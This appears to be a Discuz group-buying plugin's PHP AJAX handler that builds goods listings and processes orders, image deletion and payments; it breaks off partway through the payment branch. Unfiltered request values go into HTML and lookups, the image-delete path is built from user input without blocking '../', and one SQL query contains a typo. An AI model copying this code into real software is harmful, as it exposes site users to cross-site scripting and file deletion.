<?php
ob_start();
/*
 *DisM!Ӧ�����ģ�dism.taobao.com
 *������ҵ���/ģ������ ����DisM!Ӧ������
 *����Դ��Դ�������ռ�,��������ѧϰ����������������ҵ��;����������24Сʱ��ɾ��!
 *����ַ�������Ȩ��,�뼰ʱ��֪����,���Ǽ���ɾ��!
 */

if(!defined('IN_DISCUZ')) {
	exit('Access Denied');
}

require_once DISCUZ_ROOT.'./source/plugin/it618_tuan/tuan_function.func.php';

$uid = $_G['uid'];
$it618_pid=intval($_GET['it618_pid']);

$pagetype=$_GET['pagetype'];
$idforly=intval($_GET['idforly']);


if($_GET['ac']=="getmode"){
	$modeid=intval($_GET['modeid']);
	require_once DISCUZ_ROOT.'./source/plugin/it618_tuan/getmode.func.php';
	
	if($it618_tuan_diy=C::t('#it618_tuan#it618_tuan_diy')->fetch_by_id($modeid)){
		if($it618_tuan_diy['it618_isjs']==1){
			if((time()-$it618_tuan_diy["it618_time"])<(60*$it618_tuan_diy["it618_catchtime"])){
				exit;
			}else{
				C::t('#it618_tuan#it618_tuan_diy')->update_it618_time_by_id(time(),$it618_tuan_diy["id"]);
			}
			
			$tmpstr = it618_tuan_getmodecontent($it618_tuan_diy['it618_type'],$it618_tuan_diy['it618_modecode'],$it618_tuan_diy['it618_count']);
			$tmpstr=str_replace(array("\r\n", "\r", "\n"),"",$tmpstr);
			$tmpstr=str_replace("'",'"',$tmpstr);
			
			echo "document.write('".$tmpstr."')";
		}
	}
	exit;
}


if($_GET['ac']=="home_goods"){
	$home_goods=C::t('#it618_tuan#it618_tuan_set')->getsetvalue_by_setname($_GET['ac1']);
	
	$tmparr=explode(",",$home_goods);
	if($_GET['wap']!=1){
		if(count($tmparr)>2){
			$goods_count=$tmparr[0];
		}else{
			$goods_count=15;
		}
	}else{
		if(count($tmparr)>2){
			$goods_count=$tmparr[1];
		}else{
			$goods_count=8;
		}
	}
	
	if($_GET['ac1']=='zjsalegoods'){	
		$query = DB::query("SELECT max(id) as maxid,it618_pid FROM ".DB::table('it618_tuan_sale')." where it618_state>0 GROUP BY it618_pid ORDER BY maxid desc limit 0,".$goods_count);
	}
	
	if($_GET['ac1']=='weeksalegoods'){
		$tomonth = date('n'); 
		$todate = date('j'); 
		$toyear = date('Y');
		$time=mktime(0, 0, 0, $tomonth, $todate-7, $toyear);
		$query = DB::query("SELECT it618_pid,count(1) as salecount FROM ".DB::table('it618_tuan_sale')." where it618_state>0 and it618_time>=$time GROUP BY it618_pid ORDER BY salecount desc limit 0,".$goods_count);
	}
	
	if($_GET['ac1']=='newgoods'){
		$query = DB::query("SELECT g.id as it618_pid FROM ".DB::table('it618_tuan_goods')." g left join ".DB::table('it618_tuan_shop')." b on g.it618_shopid=b.id where g.it618_state=1 and b.it618_state=2 and b.it618_htstate=1 ORDER BY g.id desc limit 0,".$goods_count);
	}
	
	if($_GET['ac1']=='hotgoods'){
		$query = DB::query("SELECT g.id as it618_pid FROM ".DB::table('it618_tuan_goods')." g left join ".DB::table('it618_tuan_shop')." b on g.it618_shopid=b.id where g.it618_state=1 and b.it618_state=2 and b.it618_htstate=1 ORDER BY g.it618_views desc limit 0,".$goods_count);
	}
	
	if($_GET['wap']!=1){
		$i=1;
		$home_goodstmp='';
		while($it618_homegoods = DB::fetch($query)) {
			$it618_tuan_goods=C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id($it618_homegoods['it618_pid']);
		
			if($it618_tuan_goods['it618_state']!=1)continue;
			
			if($i%5==1){$home_goodstmp.='<li>';$noml=' noml';}else{$noml='';}
			
			$pj=$it618_tuan_goods['it618_pjpfstr'];
			$views=' '.it618_tuan_getlang('s118').''.$it618_tuan_goods['it618_views'];
					
			$tmpurl=it618_tuan_getrewrite('tuan_product',$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:product&pid='.$it618_tuan_goods['id']);
			$home_goodstmp.='<div class="small-goods'.$noml.'">
							  <a class="small-goods-img" href="'.$tmpurl.'" target="_blank"><img src="'.it618_tuan_getwapppic($it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']).'" src="source/plugin/it618_tuan/images/a.gif" alt="'.$it618_tuan_goods['it618_name'].'" width="198" height="183" /></a>
							  <h4>
								  <a class="small-goods-name" href="'.$tmpurl.'" target="_blank" title="'.$it618_tuan_goods['it618_name'].'">'.$it618_tuan_goods['it618_name'].'</a>
								  <div style="font-weight:normal;font-size:12px;"><p style="float:right">'.it618_tuan_getlang('s465').$it618_tuan_goods['it618_salecount'].'</p>'.$pj.' '.$views.'</div>
							  </h4>
							  <div class="small-goods-info">
								  <span class="price">'.it618_tuan_getgoodsprice($it618_tuan_goods).'</span>
							  </div>
						  </div>';
			if($i%5==0)$home_goodstmp.='</li>';
			$i=$i+1;
		}
		if(($i-1)%5>0)$home_goodstmp.='</li>';
		
		$home_goodstmp='<div id="'.$_GET['ac1'].'" class="slider-warp lazy_start" options="'.$_GET['ac1'].'|left|0|5000|1000|1|1|0|1">
							<div class="slider-ulwarp">
								<ul class="slider-ul">'.$home_goodstmp.'</ul>	
							</div>
						</div>';
	}else{

		$home_goodstmp='';
		$width=intval($_GET['width']/3-15);
		while($it618_homegoods = DB::fetch($query)) {
			$it618_tuan_goods=C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id($it618_homegoods['it618_pid']);
			
			if($it618_tuan_goods['it618_state']!=1)continue;

			$tmpurl=it618_tuan_getrewrite('tuan_wap','product@'.$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:wap&pagetype=product&cid='.$it618_tuan_goods['id']);
			
			$home_goodstmp.='<td width="'.$width.'"><a href="'.$tmpurl.'">
								<img width="'.$width.'" src="'.it618_tuan_getwapppic($it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']).'"/>
								<div class="tdname">'.$it618_tuan_goods['it618_name'].'</div>
								<div class="tdprice"><span>'.it618_tuan_getgoodsprice($it618_tuan_goods).'</span></div>
							</a>
							</td>';
		}
		echo '<tr>'.$home_goodstmp.'</tr>';exit;
	}
	
	echo $home_goodstmp;exit;
}


if($_GET['ac']=="getsaleaudio"){
	if($it618_tuan_saleaudio=C::t('#it618_tuan#it618_tuan_saleaudio')->fetch_by_it618_shopid($_GET['shopid'])){

		if(isset($_GET['update']))$isupdate=1;
		
		if($it618_tuan_saleaudio['it618_state']==1){
			$isupdate=1;
			echo 'it618_splitok';
		}
		
		if($isupdate==1){
			C::t('#it618_tuan#it618_tuan_saleaudio')->update($it618_tuan_saleaudio['id'],array(
				'it618_state' => 0
			));
		}
		
		exit;
	}
}

if($_GET['formhash']!=FORMHASH)exit;


if($_GET['ac']=="sc_top"){	
	$ktxmoney = C::t('#it618_tuan#it618_tuan_shop')->fetch_money_by_id($_GET['sid']);
	$sqmoney=C::t('#it618_tuan#it618_tuan_tx')->sumtxmoney_by_shopid_state($_GET['sid'],1);
	$txmoney=C::t('#it618_tuan#it618_tuan_tx')->sumtxmoney_by_shopid_state($_GET['sid'],2);
	
	if($sqmoney=='')$sqmoney='0.00';
	if($txmoney=='')$txmoney='0.00';else $txmoney=round($txmoney,2);
	
	echo '<font color=#fff><strong>'.$_G['username'].'</strong></font> '.it618_tuan_getlang('s420').'<font color=#6F0>'.$ktxmoney.'</font> '.it618_tuan_getlang('s421').'<font color=#FF6>'.$sqmoney.'</font> '.it618_tuan_getlang('s422').'<font color=#FF6>'.$txmoney.'</font> '.it618_tuan_getlang('s125').'it618_split'.FORMHASH;
}


if($_GET['ac']=="getshopgoods"){
	echo it618_tuan_getshopgoods($_GET['shopid'],$_GET['page'],$_GET['wap']);
}


if($_GET['ac']=="payok"){
	
	if($_GET['ac1']=="pay"){
		$salecount=DB::result_first("SELECT count(1) FROM ".DB::table('it618_tuan_sale')." WHERE it618_state!=0 and id=".intval($_GET['saleid']));
	}
	if($_GET['ac1']=="gwcpay"){
		$salecount=DB::result_first("SELECT count(1) FROM ".DB::table('it618_tuan_gwcsale_main')." WHERE it618_state=!=0 and id=".intval($_GET['saleid']));
	}
	
	if($salecount>0){
		echo 'it618_splitok';exit;
	}
}


if($_GET['ac']=="imgdelete"){
	if($uid<=0){
		echo '0';
	}else{
		$shopid=intval($_GET['shopid']);
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		if($shopid==0){
			$shopadmin=explode(",",$it618_tuan['tuan_shopadmin']);
			if(!in_array($_G['uid'],$shopadmin)){
				echo '0';exit;
			}
		}else{
			$it618_tuan_shop=C::t('#it618_tuan#it618_tuan_shop')->fetch_by_id($shopid);
			if($it618_tuan_shop['it618_uid']!=$uid){
				echo '0';exit;
			}
		}
		
		if($shopid==0){
			$tmparr=explode('source/plugin/it618_tuan/kindeditor/attached/image/',$_GET['imgurl']);
			if(count($tmparr)>1){
				$delpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/attached/image/'.$tmparr[1];
			}
			$tmparr=explode('source/plugin/it618_tuan/kindeditor/data/shop',$_GET['imgurl']);
			if(count($tmparr)>1){
				$delpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/data/shop'.$tmparr[1];
			}
		}else{
			$tmparr=explode('source/plugin/it618_tuan/kindeditor/data/shop'.$shopid.'/',$_GET['imgurl']);
			if(count($tmparr)>1){
				$delpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/data/shop'.$shopid.'/'.$tmparr[1];
			}
		}
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		if (file_exists($delpath)) {
			$result=unlink($delpath);
			if(it618_tuan_dirsize(dirname($delpath))==0){
				rmdir(dirname($delpath));
			}
			
			echo '1';
		}else{
			echo '0';
		}
	}
	exit;
}


if($_GET['ac']=="order_add"){
	if($uid<=0){
		echo it618_tuan_getlang('s485');
	}else{
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		$pid=intval($_GET['pid']);
		$it618_gtypeid=intval($_GET['it618_gtypeid']);
		$it618_count=intval($_GET['it618_count']);
		
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($it618_count<=0){
			echo it618_tuan_getlang('s486');exit;
		}
		
		if(!($it618_tuan_goods = C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id_state($pid,1))){
			echo it618_tuan_getlang('s487');exit;
		}
		
		if($it618_gtypeid>0){
			if($it618_tuan_goods_type=C::t('#it618_tuan#it618_tuan_goods_type')->fetch_by_idok($it618_gtypeid)){
			}else{
				echo it618_tuan_getlang('s1714');it618_tuan_delsalework();exit;
			}
		}
		
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		
		if($it618_saletype==3){
			echo it618_tuan_getlang('s471');exit;
		}
		
		$creditnum=DB::result_first("select extcredits".$it618_tuan['tuan_credit']." from ".DB::table('common_member_count')." where uid=".$uid);
		if($creditnum<$it618_tuan['tuan_orderbuycount']){
			echo $it618_tuan_lang['s1028'].$creditname.$it618_tuan_lang['s1029'];exit;
		}
		
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;

		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}

		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		if($ii1i11i[9]!='n')exit;
		$id = C::t('#it618_tuan#it618_tuan_order')->insert(array(
			'it618_shopid' => $it618_tuan_goods['it618_shopid'],
			'it618_uid' => $uid,
			'it618_pid' => $pid,
			'it618_gtypeid' => $it618_gtypeid,
			'it618_count' => $it618_count,
			'it618_jfcount' => $it618_tuan['tuan_orderbuycount'],
			'it618_name' => it618_tuan_utftogbk($_GET["it618_name"]),
			'it618_tel' => it618_tuan_utftogbk($_GET["it618_tel"]),
			'it618_addr' => it618_tuan_utftogbk($_GET["it618_addr"]),
			'it618_bz' => it618_tuan_utftogbk($_GET["it618_bz"]),
			'it618_state' => 1,
			'it618_time' => $_G['timestamp']
		), true);

		if($id>0){			
			C::t('common_member_count')->increase($uid, array(
				'extcredits'.$it618_tuan['tuan_credit'] => (0-$it618_tuan['tuan_orderbuycount']))
			);
			if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
			
			if($_GET['it618_gthdid']>0){
				it618_tuan_sendmessage('order_shop1',$id);
			}
			it618_tuan_sendmessage('order_shop',$id);
			
			echo 'ok';
		}
	}
	exit;
}


if($_GET['ac']=="salesd_add"){
	if($uid<=0){
		echo it618_tuan_getlang('s485');
	}else{
		$sd_userpower=C::t('#it618_tuan#it618_tuan_set')->getsetvalue_by_setname('sd_userpower');
		$sd_saleuser=C::t('#it618_tuan#it618_tuan_set')->getsetvalue_by_setname('sd_saleuser');

		$sd_userpowerarr=explode(",",$sd_userpower);
		if(!in_array($uid,$sd_userpowerarr)){
			echo $it618_tuan_lang['s1058'];exit;
		}
		
		if($sd_saleuser==''){
			echo $it618_tuan_lang['s1059'];exit;
		}
		$sd_saleuserarr=explode(",",$sd_saleuser);
		$arrindex=array_rand($sd_saleuserarr);
		$uid=$sd_saleuserarr[$arrindex];
		
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		$pid=intval($_GET['pid']);
		$it618_saletype=intval($_GET['it618_saletype']);
		$it618_gthdid=intval($_GET['it618_gthdid']);
		$it618_gtypeid=intval($_GET['it618_gtypeid']);
		$it618_count=intval($_GET['it618_count']);

		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($it618_count<=0){
			echo it618_tuan_getlang('s486');exit;
		}
		
		if(!($it618_tuan_goods = C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id_state($pid,1))){
			echo it618_tuan_getlang('s487');exit;
		}
		
		if($it618_gtypeid>0){
			if($it618_tuan_goods_type=C::t('#it618_tuan#it618_tuan_goods_type')->fetch_by_idok($it618_gtypeid)){
				$goods_count=$it618_tuan_goods_type['it618_count'];
				$goods_price=$it618_tuan_goods_type['it618_saleprice'];
			}else{
				echo it618_tuan_getlang('s1714');exit;
			}
		}else{
			$goods_count=$it618_tuan_goods['it618_count'];
			$goods_price=$it618_tuan_goods['it618_saleprice'];
		}
		
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		
		if($it618_count>$goods_count){
			echo it618_tuan_getlang('s864');it618_tuan_delsalework();exit;
		}
		
		$yfmoney=$goods_price*$it618_count+$it618_yunfei;

		
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		
		$it618_tuan_shop=C::t('#it618_tuan#it618_tuan_shop')->fetch_by_id($it618_tuan_goods['it618_shopid']);

		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		if($ii1i11i[9]!='n')exit;
		$id = C::t('#it618_tuan#it618_tuan_sale')->insert(array(
			'it618_shopid' => $it618_tuan_goods['it618_shopid'],
			'it618_uid' => $uid,
			'it618_pid' => $pid,
			'it618_gthdid' => $it618_gthdid,
			'it618_gtypeid' => $it618_gtypeid,
			'it618_saletype' => $it618_saletype,
			'it618_price' => $goods_price,
			'it618_jfbl' => $it618_tuan_goods['it618_jfbl'],
			'it618_count' => $it618_count,
			'it618_isservice1' => $it618_tuan_goods['it618_isservice1'],
			'it618_isservice2' => $it618_tuan_goods['it618_isservice2'],
			'it618_isservice3' => $it618_tuan_goods['it618_isservice3'],
			'it618_bsaletime' => $it618_tuan_goods['it618_bsaletime'],
			'it618_esaletime' => $it618_tuan_goods['it618_esaletime'],
			'it618_state' => 1,
			'it618_time' => $_G['timestamp']
		), true);

		if($id>0){
			if($it618_saletype==3)it618_tuan_setkm($id);
			
			$it618_tuan_sale=C::t('#it618_tuan#it618_tuan_sale')->fetch_by_id($id);
			C::t('#it618_tuan#it618_tuan_sale')->update_it618_state($id,3);

			if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
			
			it618_tuan_updategoodscount($it618_tuan_sale);
			
			echo 'ok';it618_tuan_delsalework();
		}
	}
	exit;
}


if($_GET['ac']=="pay_add"){
	if($uid<=0){
		echo it618_tuan_getlang('s485');
	}else{
		set_time_limit (0);
		ignore_user_abort(true);
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;

		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_tuan_salework'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_tuan_delsalework();
			}
		}
		C::t('#it618_tuan#it618_tuan_salework')->insert(array(
			'it618_iswork' => 1
		), true);
		
		$pid=intval($_GET['pid']);
		$it618_saletype=intval($_GET['it618_saletype']);
		$it618_gthdid=intval($_GET['it618_gthdid']);
		$it618_gtypeid=intval($_GET['it618_gtypeid']);
		$it618_kdid=intval($_GET['it618_kdid']);
		$it618_count=intval($_GET['it618_count']);
		
		if($IsUnion==1&&$_GET['tuijcode']!=''){
			require_once DISCUZ_ROOT.'./source/plugin/it618_union/unionsaletc.func.php';
			$it618_tuijid=Union_IsTuiJoin('tuan',$pid,$_GET['tuijcode']);
		}
		
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		
		if($it618_count<=0){
			echo it618_tuan_getlang('s486');it618_tuan_delsalework();exit;
		}
		
		if(!($it618_tuan_goods = C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id_state($pid,1))){
			echo it618_tuan_getlang('s487');it618_tuan_delsalework();exit;
		}
		
		$typecount=C::t('#it618_tuan#it618_tuan_goods_type')->counttype_by_pid_ok($pid);
		if($typecount>0){
			if($it618_gtypeid==0){
				echo it618_tuan_getlang('t766');it618_tuan_delsalework();exit;
			}
		}
		
		if($IsGroup==1){
			$salepower=it618_tuan_groupsalepower($pid);
			if($salepower==1){
				echo it618_tuan_getlang('s1554');it618_tuan_delsalework();exit;
			}
			if($salepower==2){
				echo it618_tuan_getlang('s1555');it618_tuan_delsalework();exit;
			}
		}
		
		if($it618_gtypeid>0){
			if($it618_tuan_goods_type=C::t('#it618_tuan#it618_tuan_goods_type')->fetch_by_idok($it618_gtypeid)){
				$goods_count=$it618_tuan_goods_type['it618_count'];
				$goods_price=$it618_tuan_goods_type['it618_saleprice'];
				$goods_jfid=$it618_tuan_goods_type['it618_jfid'];
				$goods_score=$it618_tuan_goods_type['it618_score'];
			}else{
				echo it618_tuan_getlang('s1714');it618_tuan_delsalework();exit;
			}
		}else{
			$goods_count=$it618_tuan_goods['it618_count'];
			$goods_price=$it618_tuan_goods['it618_saleprice'];
			$goods_jfid=$it618_tuan_goods['it618_jfid'];
			$goods_score=$it618_tuan_goods['it618_score'];
		}
		
		if($it618_count>$goods_count){
			echo it618_tuan_getlang('s864');it618_tuan_delsalework();exit;
		}
		
		if($goods_score>0){
			if(C::t('#it618_tuan#it618_tuan_jfhl')->count_by_jfid_isok($goods_jfid)==0){
				echo it618_tuan_getlang('s20');it618_tuan_delsalework();exit;
			}
		}

		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		if($it618_saletype==1){
			if($it618_tuan_goods['it618_esaletime']!=''){
				$it618_esaletime=strtotime($it618_tuan_goods['it618_esaletime'].':00');
				if($_G['timestamp']>$it618_esaletime){
					echo it618_tuan_getlang('s488');it618_tuan_delsalework();exit;
				}
			}
		}
		
		if($it618_tuan_goods['it618_saletype']==4){
			if(!($it618_saletype==1||$it618_saletype==2)){
				echo it618_tuan_getlang('s1093');it618_tuan_delsalework();exit;
			}
		}else{
			if($it618_saletype!=$it618_tuan_goods['it618_saletype']){
				echo it618_tuan_getlang('s1093');it618_tuan_delsalework();exit;
			}
		}
		
		if($it618_tuan_goods['it618_xgtype']==1){
			
			$timetmp1=explode(" ",$it618_tuan_goods['it618_xgtime1']);
			$timetmp2=explode(" ",$it618_tuan_goods['it618_xgtime2']);
			$timetmp11=explode("-",$timetmp1[0]);
			$timetmp12=explode(":",$timetmp1[1]);
			$timetmp21=explode("-",$timetmp2[0]);
			$timetmp22=explode(":",$timetmp2[1]);
			
			
			$btime=mktime($timetmp12[0], $timetmp12[1], 0, $timetmp11[1], $timetmp11[2], $timetmp11[0]);
			$etime=mktime($timetmp22[0], $timetmp22[1], 0, $timetmp21[1], $timetmp21[2], $timetmp21[0]);
			
			if($etime<$_G['timestamp']){
				echo $it618_tuan_lang['s1055'];it618_tuan_delsalework();exit;
			}else{
				if($btime>$_G['timestamp']){
					echo $it618_tuan_lang['s1056'];it618_tuan_delsalework();exit;
				}
			}
		}
		
		if($it618_tuan_goods['it618_xgtype']==2){
			$timetmp1=explode(" ",$it618_tuan_goods['it618_xgtime1']);
			$timetmp2=explode(" ",$it618_tuan_goods['it618_xgtime2']);
			$timetmp11=explode("-",$timetmp1[0]);
			$timetmp12=explode(":",$timetmp1[1]);
			$timetmp21=explode("-",$timetmp2[0]);
			$timetmp22=explode(":",$timetmp2[1]);
			
			$btime=mktime($timetmp12[0], $timetmp12[1], 0, $timetmp11[1], $timetmp11[2], $timetmp11[0]);
			$etime=mktime($timetmp22[0], $timetmp22[1], 0, $timetmp21[1], $timetmp21[2], $timetmp21[0]);
			
			if($etime<$_G['timestamp']){
				echo $it618_tuan_lang['s1055'];it618_tuan_delsalework();exit;
				
			}else{
				if($btime>$_G['timestamp']){
					echo $it618_tuan_lang['s1056'];it618_tuan_delsalework();exit;
				}else{
					$btimecur=mktime($timetmp12[0], $timetmp12[1], 0, date('n'), date('j'), date('Y'));
					$btimecur1=mktime($timetmp12[0], $timetmp12[1], 0, date('n'), date('j')+1, date('Y'));
					$etimecur=mktime($timetmp22[0], $timetmp22[1], 0, date('n'), date('j'), date('Y'));
					
					if($btimecur>$_G['timestamp']){
						echo $it618_tuan_lang['s1056'];it618_tuan_delsalework();exit;
					}
					
					if($etimecur<$_G['timestamp']){
						echo $it618_tuan_lang['s1056'];it618_tuan_delsalework();exit;
					}
				}
			}
		}
		
		if($it618_tuan_goods['it618_xgtime']==0){
			$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_tuan_sale')." where it618_pid=".$pid." and (it618_state=1 or it618_state=2 or it618_state=3) and it618_uid=".$uid);
		}else{
			$time=$_G['timestamp']-$it618_tuan_goods['it618_xgtime']*3600*24;
			
			$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_tuan_sale')." where it618_pid=".$pid." and it618_time>$time and (it618_state=1 or it618_state=2 or it618_state=3) and it618_uid=".$uid);
		}
		if($buycount=='')$buycount=0;
		
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($it618_tuan_goods['it618_xgcount']>0&&$it618_count>$it618_tuan_goods['it618_xgcount']-$buycount){
			if($it618_tuan_goods['it618_xgtime']==0){
				echo it618_tuan_getlang('s489').$it618_tuan_goods['it618_xgcount'].it618_tuan_getlang('s490').$buycount.it618_tuan_getlang('s491');it618_tuan_delsalework();exit;
			}else{
				echo it618_tuan_getlang('s492').$it618_tuan_goods['it618_xgtime'].it618_tuan_getlang('s493').$it618_tuan_goods['it618_xgcount'].it618_tuan_getlang('s490').$buycount.it618_tuan_getlang('s491');it618_tuan_delsalework();exit;
			}
		}
		
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		
		$it618_tuan_shop=C::t('#it618_tuan#it618_tuan_shop')->fetch_by_id($it618_tuan_goods['it618_shopid']);
		
		$creditnum=C::t('#it618_tuan#it618_tuan_sale')->fetch_extcredits_by_uid($it618_tuan['tuan_credit'],$it618_tuan_shop['it618_uid']);
		

		if($creditnum<$it618_tuan_shop['it618_score']){
			$shopname=$it618_tuan_shop['it618_name'];
			$tmpstr=str_replace("{shopname}",$shopname,it618_tuan_getlang('s1084'));
			$tmpstr=str_replace("{creditname}",$creditname,$tmpstr);
			echo $tmpstr;it618_tuan_delsalework();exit;
		}
		
		if($it618_kdid>0){
			$it618_tuan_kdyunfei=C::t('#it618_tuan#it618_tuan_kdyunfei')->fetch_by_id($it618_kdid);
			if($it618_count>$it618_tuan_kdyunfei['it618_firstcount']){
				$yunfeimoney=$it618_tuan_kdyunfei['it618_firstprice']+$it618_tuan_kdyunfei['it618_price']*($it618_count-$it618_tuan_kdyunfei['it618_firstcount']);
				$yunfeiscore=$it618_tuan_kdyunfei['it618_firstscore']+$it618_tuan_kdyunfei['it618_score']*($it618_count-$it618_tuan_kdyunfei['it618_firstcount']);
			}else{
				$yunfeimoney=$it618_tuan_kdyunfei['it618_firstprice'];
				$yunfeiscore=$it618_tuan_kdyunfei['it618_firstscore'];
			}
			
			if($yunfeiscore>0){
				if(C::t('#it618_tuan#it618_tuan_jfhl')->count_by_jfid_isok($it618_tuan_kdyunfei['it618_jfid'])==0){
					echo it618_tuan_getlang('s21');it618_tuan_delsalework();exit;
				}
				$yunfeijfid=$it618_tuan_kdyunfei['it618_jfid'];
				$allsumscore[$yunfeijfid]+=$yunfeiscore;
				$yunfeijfname=$_G['setting']['extcredits'][$it618_tuan_kdyunfei['it618_jfid']]['title'];
			}
		}
		
		if($IsGroup==1){
			$vipzk=it618_tuan_getvipzk($pid);
		}
		
		if($vipzk>0){
			$goods_price=$goods_price*$vipzk/100;
			$goods_score=intval($goods_score*$vipzk/100);
		}
		
		$yfmoney=$goods_price*$it618_count+$yunfeimoney;
		
		if($goods_score>0){
			$yfscore=$goods_score*$it618_count;
			$allsumscore[$goods_jfid]+=$yfscore;
		}
		
		for($i=1;$i<=8;$i++){
			if($allsumscore[$i]>0){
				$creditnum=DB::result_first("select extcredits".$i." from ".DB::table('common_member_count')." where uid=".$_G['uid']);
				if($creditnum<$allsumscore[$i]){
					echo it618_tuan_getlang('s1111').$creditnum.$_G['setting']['extcredits'][$i]['title'].it618_tuan_getlang('s1122');it618_tuan_delsalework();exit;
				}
			}
		}
		
		$quanid=intval($_GET['quanid']);
		if($quanid>0){
			require_once DISCUZ_ROOT.'./source/plugin/it618_union/function.func.php';
			$it618_union_quansale = C::t('#it618_union#it618_union_quansale')->fetch_by_id($quanid);
			if(it618_union_getisokquan($it618_union_quansale,$it618_tuan_goods['id'],$yfmoney)==''){
				echo $it618_union_lang['s319'];it618_tuan_delsalework();exit;
			}
			$it618_quanmoney=it618_union_getquantype($it618_union_quansale,'quanmoney');
			if($yfmoney<$it618_quanmoney){
				$it618_quanmoney=$yfmoney;
			}
			$yfmoney=$yfmoney-$it618_quanmoney;
		}
		
		if($yfmoney>0){
			if($_GET['paytype']==""){
				echo it618_tuan_getlang('s1069');it618_tuan_delsalework();exit;
			}
			
			$it618_state=0;
		}else{
			$it618_state=1;
		}
		
		if($ii1i11i[9]!='n')exit;
		$tmptime=$_G['timestamp'];
		$id = C::t('#it618_tuan#it618_tuan_sale')->insert(array(
			'it618_shopid' => $it618_tuan_goods['it618_shopid'],
			'it618_uid' => $uid,
			'it618_pid' => $pid,
			'it618_gthdid' => $it618_gthdid,
			'it618_gtypeid' => $it618_gtypeid,
			'it618_tuijid' => $it618_tuijid,
			'it618_saletype' => $it618_saletype,
			'it618_price' => $goods_price,
			'it618_jfid' => $goods_jfid,
			'it618_score' => $goods_score,
			'it618_yunfeijfid' => $yunfeijfid,
			'it618_yunfeiscore' => $yunfeiscore,
			'it618_quanmoney' => $it618_quanmoney,
			'it618_vipzk' => $vipzk,
			'it618_sfmoney' => $yfmoney,
			'it618_sfscore' => $yfscore,
			'it618_jfbl' => $it618_tuan_goods['it618_jfbl'],
			'it618_count' => $it618_count,
			'it618_yunfei' => $yunfeimoney,
			'it618_kdid' => $it618_kdid,
			'it618_name' => it618_tuan_utftogbk($_GET["it618_name"]),
			'it618_tel' => it618_tuan_utftogbk($_GET["it618_tel"]),
			'it618_addr' => it618_tuan_utftogbk($_GET["it618_addr"]),
			'it618_bz' => it618_tuan_utftogbk($_GET["it618_bz"]),
			'it618_isservice1' => $it618_tuan_goods['it618_isservice1'],
			'it618_isservice2' => $it618_tuan_goods['it618_isservice2'],
			'it618_isservice3' => $it618_tuan_goods['it618_isservice3'],
			'it618_bsaletime' => $it618_tuan_goods['it618_bsaletime'],
			'it618_esaletime' => $it618_tuan_goods['it618_esaletime'],
			'it618_state' => $it618_state,
			'it618_time' => $tmptime
		), true);

		if($id>0){
			for($i=1;$i<=8;$i++){
				if($allsumscore[$i]>0){
					C::t('common_member_count')->increase($uid, array(
						'extcredits'.$i => (0-$allsumscore[$i]))
					);
				}
			}
			
			if($quanid>0){
				DB::query("update ".DB::table('it618_union_quansale')." set it618_saleid=$id,it618_usetime=$tmptime,it618_state=1 where id=".$quanid);
			}
			
			if($yfmoney==0){
				if($it618_tuijid>0){
					require_once DISCUZ_ROOT.'./source/plugin/it618_union/unionsaletc.func.php';
					Union_TuiTC_Add($it618_tuijid,$id);
				}
				
				if($it618_saletype==1)it618_tuan_setcode($id);
				if($it618_saletype==3)it618_tuan_setkm($id);
				
